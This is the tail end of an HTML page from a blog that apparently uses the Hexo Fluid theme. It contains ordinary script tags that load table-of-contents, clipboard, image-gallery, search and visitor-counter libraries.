  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="/xm_custom/custom.js"></script>
<script src="/js/scrollAnimation.js"></script>
<script src="/js/Background.js"></script>



<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>



